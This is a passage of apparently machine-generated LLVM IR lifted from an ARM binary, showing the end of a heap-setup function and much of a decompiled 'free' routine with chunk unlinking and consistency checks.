  store i32 %v0_bf6c, i32* %v3_bf6c, align 4
  %v0_bf70 = load i32, i32* %lr.global-to-local, align 4
  %v1_bf70 = load i32, i32* %r5.global-to-local, align 4
  %v2_bf70 = add i32 %v1_bf70, %v0_bf70
  store i32 %v2_bf70, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_bf74

dec_label_pc_bf74:                                ; preds = %dec_label_pc_bf30.dec_label_pc_bf74_crit_edge, %dec_label_pc_bf68
  %v0_bf78 = phi i32 [ %v0_bf78.pre, %dec_label_pc_bf30.dec_label_pc_bf74_crit_edge ], [ %v2_bf70, %dec_label_pc_bf68 ]
  %v0_bf74 = load i32, i32* %r7.global-to-local, align 4
  %v1_bf74 = add i32 %v0_bf74, 8
  %v2_bf74 = inttoptr i32 %v1_bf74 to i32*
  %v3_bf74 = load i32, i32* %v2_bf74, align 4
  store i32 %v3_bf74, i32* %r2.global-to-local, align 4
  %v1_bf78 = or i32 %v0_bf78, 1
  store i32 %v1_bf78, i32* %r3.global-to-local, align 4
  %v0_bf7c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_bf7c, i32* %v2_bf74, align 4
  %v0_bf80 = load i32, i32* %r1.global-to-local, align 4
  %v1_bf80 = load i32, i32* %r2.global-to-local, align 4
  %v2_bf80 = add i32 %v1_bf80, 12
  %v3_bf80 = inttoptr i32 %v2_bf80 to i32*
  store i32 %v0_bf80, i32* %v3_bf80, align 4
  %v0_bf84 = load i32, i32* %lr.global-to-local, align 4
  %v1_bf84 = load i32, i32* %r1.global-to-local, align 4
  %v3_bf84 = add i32 %v1_bf84, %v0_bf84
  %v4_bf84 = inttoptr i32 %v3_bf84 to i32*
  store i32 %v0_bf84, i32* %v4_bf84, align 4
  %v0_bf88 = load i32, i32* %r3.global-to-local, align 4
  %v1_bf88 = load i32, i32* %r1.global-to-local, align 4
  %v2_bf88 = add i32 %v1_bf88, 4
  %v3_bf88 = inttoptr i32 %v2_bf88 to i32*
  store i32 %v0_bf88, i32* %v3_bf88, align 4
  %v0_bf8c = load i32, i32* %r2.global-to-local, align 4
  %v1_bf8c = load i32, i32* %r1.global-to-local, align 4
  %v2_bf8c = add i32 %v1_bf8c, 8
  %v3_bf8c = inttoptr i32 %v2_bf8c to i32*
  store i32 %v0_bf8c, i32* %v3_bf8c, align 4
  %v0_bf90 = load i32, i32* %r7.global-to-local, align 4
  %v1_bf90 = load i32, i32* %r1.global-to-local, align 4
  %v2_bf90 = add i32 %v1_bf90, 12
  %v3_bf90 = inttoptr i32 %v2_bf90 to i32*
  store i32 %v0_bf90, i32* %v3_bf90, align 4
  br label %dec_label_pc_bfa8

dec_label_pc_bf98:                                ; preds = %dec_label_pc_bf20
  %v2_bf98 = add i32 %v1_bf28, %v0_bf98
  %v1_bf9c = or i32 %v2_bf98, 1
  store i32 %v1_bf9c, i32* %r3.global-to-local, align 4
  %v1_bfa0 = load i32, i32* %r1.global-to-local, align 4
  %v2_bfa0 = add i32 %v1_bfa0, 4
  %v3_bfa0 = inttoptr i32 %v2_bfa0 to i32*
  store i32 %v1_bf9c, i32* %v3_bfa0, align 4
  %v0_bfa4 = load i32, i32* %r1.global-to-local, align 4
  %v1_bfa4 = load i32, i32* @r4, align 4
  %v2_bfa4 = add i32 %v1_bfa4, 44
  %v3_bfa4 = inttoptr i32 %v2_bfa4 to i32*
  store i32 %v0_bfa4, i32* %v3_bfa4, align 4
  br label %dec_label_pc_bfa8

dec_label_pc_bfa8:                                ; preds = %dec_label_pc_bf74, %dec_label_pc_bf98
  %v0_bfa8 = load i32, i32* %sl.global-to-local, align 4
  %v2_bfa8 = icmp eq i32 %v0_bfa8, 0
  store i32 %v0_bfa8, i32* %r1.global-to-local, align 4
  br i1 %v2_bfa8, label %dec_label_pc_bfb4.loopexit, label %dec_label_pc_bed0

dec_label_pc_bfb4.loopexit:                       ; preds = %dec_label_pc_bfa8
  %v0_bfb4.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_bfb4.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_bfb4

dec_label_pc_bfb4:                                ; preds = %dec_label_pc_bfb4.loopexit, %dec_label_pc_bec0
  %v1_bfb4 = phi i32 [ %v1_bfb4.pre, %dec_label_pc_bfb4.loopexit ], [ %v1_bfb410, %dec_label_pc_bec0 ]
  %v0_bfbc = phi i32 [ %v0_bfb4.pre, %dec_label_pc_bfb4.loopexit ], [ %v1_becc, %dec_label_pc_bec0 ]
  %v9_bfb4 = icmp eq i32 %v0_bfbc, %v1_bfb4
  br i1 %v9_bfb4, label %dec_label_pc_c02c, label %dec_label_pc_bfbc

dec_label_pc_bfbc:                                ; preds = %dec_label_pc_bfb4
  %v1_bfbc = add i32 %v0_bfbc, 4
  store i32 %v1_bfbc, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_bec0

dec_label_pc_bfc4.dec_label_pc_bfc4_crit_edge:    ; preds = %dec_label_pc_bfc4.preheader, %dec_label_pc_bfc4.dec_label_pc_bfc4_crit_edge
  %v0_bfc4.pre = load i32, i32* @r4, align 4
  %v1_bfc4.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_bfc4 = mul i32 %v1_bfc4.pre, 8
  %v5_bfc4 = add i32 %v4_bfc4, %v0_bfc4.pre
  %v1_bfc8 = add i32 %v1_bfc4.pre, 1
  store i32 %v1_bfc8, i32* %r2.global-to-local, align 4
  %v1_bfcc = add i32 %v5_bfc4, 44
  store i32 %v1_bfcc, i32* %r3.global-to-local, align 4
  %v2_bfd4 = add i32 %v5_bfc4, 52
  %v3_bfd4 = inttoptr i32 %v2_bfd4 to i32*
  store i32 %v1_bfcc, i32* %v3_bfd4, align 4
  %v0_bfd8 = load i32, i32* %r3.global-to-local, align 4
  %v2_bfd8 = add i32 %v0_bfd8, 12
  %v3_bfd8 = inttoptr i32 %v2_bfd8 to i32*
  store i32 %v0_bfd8, i32* %v3_bfd8, align 4
  %v7_bfdc = icmp sgt i32 %v1_bfc8, 95
  br i1 %v7_bfdc, label %dec_label_pc_bfe0, label %dec_label_pc_bfc4.dec_label_pc_bfc4_crit_edge

dec_label_pc_bfe0:                                ; preds = %dec_label_pc_bfc4.dec_label_pc_bfc4_crit_edge
  %v0_bfe0 = load i32, i32* @r4, align 4
  %v1_bfe0 = inttoptr i32 %v0_bfe0 to i32*
  %v2_bfe0 = load i32, i32* %v1_bfe0, align 4
  store i32 %v2_bfe0, i32* %r2.global-to-local, align 4
  %v1_bfe4 = add i32 %v0_bfe0, 864
  %v2_bfe4 = inttoptr i32 %v1_bfe4 to i32*
  %v3_bfe4 = load i32, i32* %v2_bfe4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_bfec = urem i32 %v2_bfe0, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_bff4 = or i32 %v3_bfe4, 1
  store i32 %v1_bff4, i32* %r1.global-to-local, align 4
  %v1_bff8 = or i32 %v1_bfec, 72
  store i32 %v1_bff8, i32* %r2.global-to-local, align 4
  %v1_bffc = add i32 %v0_bfe0, 52
  store i32 %v1_bffc, i32* %ip.global-to-local, align 4
  %v2_c000 = add i32 %v0_bfe0, 840
  %v3_c000 = inttoptr i32 %v2_c000 to i32*
  store i32 0, i32* %v3_c000, align 4
  %v0_c004 = load i32, i32* %r3.global-to-local, align 4
  %v1_c004 = add i32 %v0_c004, 65536
  store i32 %v1_c004, i32* %r3.global-to-local, align 4
  %v0_c008 = load i32, i32* %r0.global-to-local, align 4
  %v1_c008 = load i32, i32* @r4, align 4
  %v2_c008 = add i32 %v1_c008, 836
  %v3_c008 = inttoptr i32 %v2_c008 to i32*
  store i32 %v0_c008, i32* %v3_c008, align 4
  %v0_c00c = load i32, i32* %r0.global-to-local, align 4
  %v1_c00c = load i32, i32* @r4, align 4
  %v2_c00c = add i32 %v1_c00c, 844
  %v3_c00c = inttoptr i32 %v2_c00c to i32*
  store i32 %v0_c00c, i32* %v3_c00c, align 4
  %v1_c010 = load i32, i32* @r4, align 4
  %v2_c010 = add i32 %v1_c010, 852
  %v3_c010 = inttoptr i32 %v2_c010 to i32*
  store i32 %v1_c004, i32* %v3_c010, align 4
  %v1_c014 = load i32, i32* @r4, align 4
  %v2_c014 = add i32 %v1_c014, 864
  %v3_c014 = inttoptr i32 %v2_c014 to i32*
  store i32 %v1_bff4, i32* %v3_c014, align 4
  %v1_c018 = load i32, i32* @r4, align 4
  %v2_c018 = inttoptr i32 %v1_c018 to i32*
  store i32 %v1_bff8, i32* %v2_c018, align 4
  %v0_c01c = load i32, i32* %ip.global-to-local, align 4
  %v1_c01c = load i32, i32* @r4, align 4
  %v2_c01c = add i32 %v1_c01c, 44
  %v3_c01c = inttoptr i32 %v2_c01c to i32*
  store i32 %v0_c01c, i32* %v3_c01c, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_c024 = call i32 @sysconf(i32 30, i32 %v1_bff4, i32 %v1_bff8, i32 %v1_c004)
  store i32 %v4_c024, i32* @r0, align 4
  %v1_c028 = load i32, i32* @r4, align 4
  %v2_c028 = add i32 %v1_c028, 860
  %v3_c028 = inttoptr i32 %v2_c028 to i32*
  store i32 %v4_c024, i32* %v3_c028, align 4
  br label %dec_label_pc_c02c

dec_label_pc_c02c:                                ; preds = %dec_label_pc_bfb4, %dec_label_pc_bfe0
  %v2_c030 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_c030, i32* @r4, align 4
  %v1_c034 = load i32, i32* @r0, align 4
  ret i32 %v1_c034

; uselistorder directives
  uselistorder i32 %v0_bfe0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_bfd8, { 1, 0 }
  uselistorder i32 %v1_bfbc, { 1, 0 }
  uselistorder i32 %v0_bfa8, { 0, 2, 1 }
  uselistorder i32 %v0_bf84, { 1, 0 }
  uselistorder i32 %v1_bed4, { 1, 0, 2 }
  uselistorder i32 %v0_beec, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_beac, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 1, 19 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 12, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 2, 3, 12 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 2, 1, 5, 6 }
  uselistorder i32 30, { 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_c02c, { 1, 0 }
  uselistorder label %dec_label_pc_bfc4.dec_label_pc_bfc4_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_bfa8, { 1, 0 }
  uselistorder label %dec_label_pc_bf74, { 1, 0 }
  uselistorder label %dec_label_pc_bf68, { 1, 0 }
  uselistorder label %dec_label_pc_bf64, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_bf20, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_c038 = load i32, i32* @r4, align 4
  %v6_c038 = load i32, i32* @r5, align 4
  %v9_c038 = load i32, i32* @r6, align 4
  %v12_c038 = load i32, i32* @r7, align 4
  %v18_c038 = load i32, i32* @lr, align 4
  %v0_c040 = load i32, i32* @r0, align 4
  store i32 %v0_c040, i32* @r6, align 4
  %v2_c040 = icmp eq i32 %v0_c040, 0
  %v2_c044 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* @r7, align 4
  br i1 %v2_c040, label %dec_label_pc_c24c, label %dec_label_pc_c050

dec_label_pc_c050:                                ; preds = %entry
  store i32 116, i32* %r3.global-to-local, align 4
  %v4_c054 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 116) to i32*), align 4
  store i32 %v4_c054, i32* %r4.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 %v4_c054, i32* %r2.global-to-local, align 4
  %v4_c060 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 72) to i32*), align 4
  store i32 %v4_c060, i32* %r1.global-to-local, align 4
  store i32 %v2_c044, i32* %r0.global-to-local, align 4
  store i32 120, i32* %r3.global-to-local, align 4
  %v4_c06c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 120) to i32*), align 4
  store i32 %v4_c06c, i32* %ip.global-to-local, align 4
  store i32 49272, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_c06c)
  %v0_c078 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_c078, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_c080 = load i32, i32* @r7, align 4
  %v2_c080 = add i32 %v0_c080, 16
  %v3_c080 = inttoptr i32 %v2_c080 to i32*
  %v4_c080 = load i32, i32* %v3_c080, align 4
  store i32 %v4_c080, i32* %ip.global-to-local, align 4
  store i32 49292, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_c080)
  store i32 68, i32* %r3.global-to-local, align 4
  %v0_c090 = load i32, i32* @r7, align 4
  %v2_c090 = add i32 %v0_c090, 68
  %v3_c090 = inttoptr i32 %v2_c090 to i32*
  %v4_c090 = load i32, i32* %v3_c090, align 4
  store i32 %v4_c090, i32* @lr, align 4
  %v0_c094 = load i32, i32* @r6, align 4
  %v1_c094 = add i32 %v0_c094, -4
  %v2_c094 = inttoptr i32 %v1_c094 to i32*
  %v3_c094 = load i32, i32* %v2_c094, align 4
  store i32 %v3_c094, i32* %r2.global-to-local, align 4
  %v1_c098 = inttoptr i32 %v4_c090 to i32*
  %v2_c098 = load i32, i32* %v1_c098, align 4
  store i32 %v2_c098, i32* %r3.global-to-local, align 4
  %v1_c09c = and i32 %v3_c094, -4
  store i32 %v1_c09c, i32* %ip.global-to-local, align 4
  %v1_c0a0 = add i32 %v0_c094, -8
  store i32 %v1_c0a0, i32* @r5, align 4
  store i32 %v1_c0a0, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_c09c, %v2_c098
  br i1 %tmp, label %dec_label_pc_c0d0, label %dec_label_pc_c0b0

dec_label_pc_c0b0:                                ; preds = %dec_label_pc_c050
  %v1_c0b0 = or i32 %v2_c098, 3
  store i32 %v1_c0b0, i32* %r3.global-to-local, align 4
  store i32 %v1_c0b0, i32* %v1_c098, align 4
  %v3_c0b4 = load i32, i32* @lr, align 4
  %v4_c0b4 = add i32 %v3_c0b4, -8
  store i32 %v4_c0b4, i32* %lr.global-to-local, align 4
  %v0_c0b8 = load i32, i32* %ip.global-to-local, align 4
  %v3_c0b8 = udiv i32 %v0_c0b8, 8
  store i32 %v3_c0b8, i32* %r1.global-to-local, align 4
  %v1_c0bc = add i32 %v3_c0b4, -4
  store i32 %v1_c0bc, i32* @r2, align 4
  %v4_c0c0 = mul nuw i32 %v3_c0b8, 4
  %v5_c0c0 = add i32 %v4_c0c0, %v1_c0bc
  %v6_c0c0 = inttoptr i32 %v5_c0c0 to i32*
  %v7_c0c0 = load i32, i32* %v6_c0c0, align 4
  store i32 %v7_c0c0, i32* %r3.global-to-local, align 4
  %v1_c0c4 = load i32, i32* @r5, align 4
  %v2_c0c4 = add i32 %v1_c0c4, 8
  %v3_c0c4 = inttoptr i32 %v2_c0c4 to i32*
  store i32 %v7_c0c0, i32* %v3_c0c4, align 4
  %v0_c0c8 = load i32, i32* @r5, align 4
  %v1_c0c8 = load i32, i32* @r2, align 4
  %v2_c0c8 = load i32, i32* %r1.global-to-local, align 4
  %v5_c0c8 = mul i32 %v2_c0c8, 4
  %v6_c0c8 = add i32 %v5_c0c8, %v1_c0c8
  %v7_c0c8 = inttoptr i32 %v6_c0c8 to i32*
  store i32 %v0_c0c8, i32* %v7_c0c8, align 4
  br label %dec_label_pc_c234

dec_label_pc_c0d0:                                ; preds = %dec_label_pc_c050
  %v1_c0d0 = and i32 %v3_c094, 2
  %v2_c0d0 = icmp eq i32 %v1_c0d0, 0
  br i1 %v2_c0d0, label %dec_label_pc_c0d8, label %dec_label_pc_c20c

dec_label_pc_c0d8:                                ; preds = %dec_label_pc_c0d0
  %v1_c0d8 = or i32 %v2_c098, 1
  store i32 %v1_c0d8, i32* %r3.global-to-local, align 4
  store i32 %v1_c0d8, i32* %v1_c098, align 4
  %v0_c0e0 = load i32, i32* @r6, align 4
  %v1_c0e0 = add i32 %v0_c0e0, -4
  %v2_c0e0 = inttoptr i32 %v1_c0e0 to i32*
  %v3_c0e0 = load i32, i32* %v2_c0e0, align 4
  store i32 %v3_c0e0, i32* %r3.global-to-local, align 4
  %v0_c0e4 = load i32, i32* @r5, align 4
  %v1_c0e4 = load i32, i32* %ip.global-to-local, align 4
  %v2_c0e4 = add i32 %v1_c0e4, %v0_c0e4
  store i32 %v2_c0e4, i32* %lr.global-to-local, align 4
  %v1_c0e8 = urem i32 %v3_c0e0, 2
  %v2_c0e8 = icmp eq i32 %v1_c0e8, 0
  %v1_c0ec = add i32 %v2_c0e4, 4
  %v2_c0ec = inttoptr i32 %v1_c0ec to i32*
  %v3_c0ec = load i32, i32* %v2_c0ec, align 4
  store i32 %v3_c0ec, i32* %r8.global-to-local, align 4
  br i1 %v2_c0e8, label %dec_label_pc_c0f4, label %dec_label_pc_c128

dec_label_pc_c0f4:                                ; preds = %dec_label_pc_c0d8
  %v1_c0f4 = add i32 %v0_c0e0, -8
  %v2_c0f4 = inttoptr i32 %v1_c0f4 to i32*
  %v3_c0f4 = load i32, i32* %v2_c0f4, align 4
  store i32 %v3_c0f4, i32* %r1.global-to-local, align 4
  %v2_c0f8 = sub i32 %v0_c0e4, %v3_c0f4
  store i32 %v2_c0f8, i32* %r3.global-to-local, align 4
  %v1_c0fc = add i32 %v2_c0f8, 8
  %v2_c0fc = inttoptr i32 %v1_c0fc to i32*
  %v3_c0fc = load i32, i32* %v2_c0fc, align 4
  store i32 %v3_c0fc, i32* %r2.global-to-local, align 4
  %v1_c100 = add i32 %v3_c0fc, 12
  %v2_c100 = inttoptr i32 %v1_c100 to i32*
  %v3_c100 = load i32, i32* %v2_c100, align 4
  store i32 %v3_c100, i32* %r4.global-to-local, align 4
  %v9_c104 = icmp eq i32 %v3_c100, %v2_c0f8
  %v1_c108 = add i32 %v2_c0f8, 12
  %v2_c108 = inttoptr i32 %v1_c108 to i32*
  %v3_c108 = load i32, i32* %v2_c108, align 4
  store i32 %v3_c108, i32* %r0.global-to-local, align 4
  br i1 %v9_c104, label %dec_label_pc_c110, label %dec_label_pc_c174

dec_label_pc_c110:                                ; preds = %dec_label_pc_c0f4
  %v1_c110 = add i32 %v3_c108, 8
  %v2_c110 = inttoptr i32 %v1_c110 to i32*
  %v3_c110 = load i32, i32* %v2_c110, align 4
  store i32 %v3_c110, i32* %r3.global-to-local, align 4
  %v9_c114 = icmp eq i32 %v3_c110, %v2_c0f8
  br i1 %v9_c114, label %dec_label_pc_c11c, label %dec_label_pc_c174

dec_label_pc_c11c:                                ; preds = %dec_label_pc_c110
  store i32 %v3_c0fc, i32* %v2_c110, align 4
  %v0_c120 = load i32, i32* %r0.global-to-local, align 4
  %v1_c120 = load i32, i32* %r2.global-to-local, align 4
  %v2_c120 = add i32 %v1_c120, 12
  %v3_c120 = inttoptr i32 %v2_c120 to i32*
  store i32 %v0_c120, i32* %v3_c120, align 4
  %v0_c124 = load i32, i32* %ip.global-to-local, align 4
  %v1_c124 = load i32, i32* %r1.global-to-local, align 4
  %v2_c124 = add i32 %v1_c124, %v0_c124
  store i32 %v2_c124, i32* %ip.global-to-local, align 4
  %v0_c134.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_c138.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_c128

dec_label_pc_c128:                                ; preds = %dec_label_pc_c0d8, %dec_label_pc_c11c
  %v0_c1b4 = phi i32 [ %v1_c0e4, %dec_label_pc_c0d8 ], [ %v2_c124, %dec_label_pc_c11c ]
  %v0_c138 = phi i32 [ %v3_c0ec, %dec_label_pc_c0d8 ], [ %v0_c138.pre, %dec_label_pc_c11c ]
  %v1_c14c = phi i32 [ %v2_c0e4, %dec_label_pc_c0d8 ], [ %v0_c134.pre, %dec_label_pc_c11c ]
  store i32 68, i32* %r3.global-to-local, align 4
  %v0_c12c = load i32, i32* @r7, align 4
  %v2_c12c = add i32 %v0_c12c, 68
  %v3_c12c = inttoptr i32 %v2_c12c to i32*
  %v4_c12c = load i32, i32* %v3_c12c, align 4
  store i32 %v4_c12c, i32* @r2, align 4
  %v1_c130 = add i32 %v4_c12c, 44
  %v2_c130 = inttoptr i32 %v1_c130 to i32*
  %v3_c130 = load i32, i32* %v2_c130, align 4
  store i32 %v3_c130, i32* %r3.global-to-local, align 4
  %v9_c134 = icmp eq i32 %v1_c14c, %v3_c130
  %v1_c138 = and i32 %v0_c138, -4
  store i32 %v1_c138, i32* %r0.global-to-local, align 4
  br i1 %v9_c134, label %dec_label_pc_c1b4, label %dec_label_pc_c140

dec_label_pc_c140:                                ; preds = %dec_label_pc_c128
  %v2_c140 = add i32 %v1_c14c, %v1_c138
  store i32 %v2_c140, i32* %r3.global-to-local, align 4
  %v1_c144 = add i32 %v2_c140, 4
  %v2_c144 = inttoptr i32 %v1_c144 to i32*
  %v3_c144 = load i32, i32* %v2_c144, align 4
  store i32 %v3_c144, i32* %r3.global-to-local, align 4
  %v1_c148 = urem i32 %v3_c144, 2
  %v2_c148 = icmp eq i32 %v1_c148, 0
  %v2_c14c = add i32 %v1_c14c, 4
  %v3_c14c = inttoptr i32 %v2_c14c to i32*
  store i32 %v1_c138, i32* %v3_c14c, align 4
  br i1 %v2_c148, label %dec_label_pc_c154, label %dec_label_pc_c140.dec_label_pc_c184_crit_edge

dec_label_pc_c140.dec_label_pc_c184_crit_edge:    ; preds = %dec_label_pc_c140
  %v0_c194.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_c184

dec_label_pc_c154:                                ; preds = %dec_label_pc_c140
  %v0_c154 = load i32, i32* %lr.global-to-local, align 4
  %v1_c154 = add i32 %v0_c154, 8
  %v2_c154 = inttoptr i32 %v1_c154 to i32*
  %v3_c154 = load i32, i32* %v2_c154, align 4
  store i32 %v3_c154, i32* %r1.global-to-local, align 4
  %v1_c158 = add i32 %v3_c154, 12
  %v2_c158 = inttoptr i32 %v1_c158 to i32*
  %v3_c158 = load i32, i32* %v2_c158, align 4
  store i32 %v3_c158, i32* %r3.global-to-local, align 4
  %v9_c15c = icmp eq i32 %v3_c158, %v0_c154
  %v1_c160 = add i32 %v0_c154, 12
  %v2_c160 = inttoptr i32 %v1_c160 to i32*
  %v3_c160 = load i32, i32* %v2_c160, align 4
  store i32 %v3_c160, i32* %r2.global-to-local, align 4
  br i1 %v9_c15c, label %dec_label_pc_c168, label %dec_label_pc_c174

dec_label_pc_c168:                                ; preds = %dec_label_pc_c154
  %v1_c168 = add i32 %v3_c160, 8
  %v2_c168 = inttoptr i32 %v1_c168 to i32*
  %v3_c168 = load i32, i32* %v2_c168, align 4
  store i32 %v3_c168, i32* %r3.global-to-local, align 4
  %v9_c16c = icmp eq i32 %v3_c168, %v0_c154
  br i1 %v9_c16c, label %dec_label_pc_c178, label %dec_label_pc_c174

dec_label_pc_c174:                                ; preds = %dec_label_pc_c154, %dec_label_pc_c110, %dec_label_pc_c0f4, %dec_label_pc_c168
  %v0_c174 = call i32 @abort()
  store i32 %v0_c174, i32* %r0.global-to-local, align 4
  %v0_c178.pre = load i32, i32* @r1, align 4
  %v1_c178.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_c178

dec_label_pc_c178:                                ; preds = %dec_label_pc_c168, %dec_label_pc_c174
  %v1_c178 = phi i32 [ %v3_c160, %dec_label_pc_c168 ], [ %v1_c178.pre, %dec_label_pc_c174 ]
  %v0_c178 = phi i32 [ %v3_c154, %dec_label_pc_c168 ], [ %v0_c178.pre, %dec_label_pc_c174 ]
  %v2_c178 = add i32 %v1_c178, 8
  %v3_c178 = inttoptr i32 %v2_c178 to i32*
  store i32 %v0_c178, i32* %v3_c178, align 4
  %v0_c17c = load i32, i32* %r2.global-to-local, align 4
  %v1_c17c = load i32, i32* %r1.global-to-local, align 4
  %v2_c17c = add i32 %v1_c17c, 12
  %v3_c17c = inttoptr i32 %v2_c17c to i32*
  store i32 %v0_c17c, i32* %v3_c17c, align 4
  %v0_c180 = load i32, i32* %ip.global-to-local, align 4
  %v1_c180 = load i32, i32* %r0.global-to-local, align 4
  %v2_c180 = add i32 %v1_c180, %v0_c180
  store i32 %v2_c180, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_c184

dec_label_pc_c184:                                ; preds = %dec_label_pc_c140.dec_label_pc_c184_crit_edge, %dec_label_pc_c178
  %v0_c194 = phi i32 [ %v0_c194.pre, %dec_label_pc_c140.dec_label_pc_c184_crit_edge ], [ %v2_c180, %dec_label_pc_c178 ]
  store i32 68, i32* %r3.global-to-local, align 4
  %v0_c188 = load i32, i32* @r7, align 4
  %v2_c188 = add i32 %v0_c188, 68
  %v3_c188 = inttoptr i32 %v2_c188 to i32*
  %v4_c188 = load i32, i32* %v3_c188, align 4
  %v1_c18c = add i32 %v4_c188, 52
  store i32 %v1_c18c, i32* %r3.global-to-local, align 4
  %v1_c190 = add i32 %v4_c188, 60
  %v2_c190 = inttoptr i32 %v1_c190 to i32*
  %v3_c190 = load i32, i32* %v2_c190, align 4
  store i32 %v3_c190, i32* %r1.global-to-local, align 4
  %v1_c194 = or i32 %v0_c194, 1
  store i32 %v1_c194, i32* @r2, align 4
  %v1_c198 = load i32, i32* %r4.global-to-local, align 4
  %v2_c198 = add i32 %v1_c198, 12
  %v3_c198 = inttoptr i32 %v2_c198 to i32*
  store i32 %v1_c18c, i32* %v3_c198, align 4
  %v0_c19c = load i32, i32* %r1.global-to-local, align 4
  %v1_c19c = load i32, i32* %r4.global-to-local, align 4
  %v2_c19c = add i32 %v1_c19c, 8
  %v3_c19c = inttoptr i32 %v2_c19c to i32*
  store i32 %v0_c19c, i32* %v3_c19c, align 4
  %v0_c1a0 = load i32, i32* @r2, align 4
  %v1_c1a0 = load i32, i32* %r4.global-to-local, align 4
  %v2_c1a0 = add i32 %v1_c1a0, 4
  %v3_c1a0 = inttoptr i32 %v2_c1a0 to i32*
  store i32 %v0_c1a0, i32* %v3_c1a0, align 4
  %v0_c1a4 = load i32, i32* %ip.global-to-local, align 4
  %v1_c1a4 = load i32, i32* %r4.global-to-local, align 4
  %v3_c1a4 = add i32 %v1_c1a4, %v0_c1a4
  %v4_c1a4 = inttoptr i32 %v3_c1a4 to i32*
  store i32 %v0_c1a4, i32* %v4_c1a4, align 4
  %v0_c1a8 = load i32, i32* %r4.global-to-local, align 4
  %v1_c1a8 = load i32, i32* %r1.global-to-local, align 4
  %v2_c1a8 = add i32 %v1_c1a8, 12
  %v3_c1a8 = inttoptr i32 %v2_c1a8 to i32*
  store i32 %v0_c1a8, i32* %v3_c1a8, align 4
  %v0_c1ac = load i32, i32* %r4.global-to-local, align 4
  %v1_c1ac = load i32, i32* %r3.global-to-local, align 4
  %v2_c1ac = add i32 %v1_c1ac, 8
  %v3_c1ac = inttoptr i32 %v2_c1ac to i32*
  store i32 %v0_c1ac, i32* %v3_c1ac, align 4
  br label %dec_label_pc_c1c4

dec_label_pc_c1b4:                                ; preds = %dec_label_pc_c128
  %v2_c1b4 = add i32 %v1_c138, %v0_c1b4
  store i32 %v2_c1b4, i32* %ip.global-to-local, align 4
  %v1_c1b8 = or i32 %v2_c1b4, 1
  store i32 %v1_c1b8, i32* %r3.global-to-local, align 4
  %v0_c1bc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_c1bc, i32* %v2_c130, align 4
  %v0_c1c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_c1c0 = load i32, i32* %r4.global-to-local, align 4
  %v2_c1c0 = add i32 %v1_c1c0, 4
  %v3_c1c0 = inttoptr i32 %v2_c1c0 to i32*
  store i32 %v0_c1c0, i32* %v3_c1c0, align 4
  br label %dec_label_pc_c1c4

dec_label_pc_c1c4:                                ; preds = %dec_label_pc_c184, %dec_label_pc_c1b4
  %v0_c1c4 = load i32, i32* %ip.global-to-local, align 4
  %v3_c1c8 = icmp ult i32 %v0_c1c4, 131070
  br i1 %v3_c1c8, label %dec_label_pc_c234, label %dec_label_pc_c1cc

dec_label_pc_c1cc:                                ; preds = %dec_label_pc_c1c4
  store i32 68, i32* %r3.global-to-local, align 4
  %v0_c1d0 = load i32, i32* @r7, align 4
  %v2_c1d0 = add i32 %v0_c1d0, 68
  %v3_c1d0 = inttoptr i32 %v2_c1d0 to i32*
  %v4_c1d0 = load i32, i32* %v3_c1d0, align 4
  store i32 %v4_c1d0, i32* @r4, align 4
  %v1_c1d4 = inttoptr i32 %v4_c1d0 to i32*
  %v2_c1d4 = load i32, i32* %v1_c1d4, align 4
  store i32 %v2_c1d4, i32* %r3.global-to-local, align 4
  %v1_c1d8 = and i32 %v2_c1d4, 2
  %v2_c1d8 = icmp eq i32 %v1_c1d8, 0
  br i1 %v2_c1d8, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_c1cc
  store i32 %v4_c1d0, i32* %r0.global-to-local, align 4
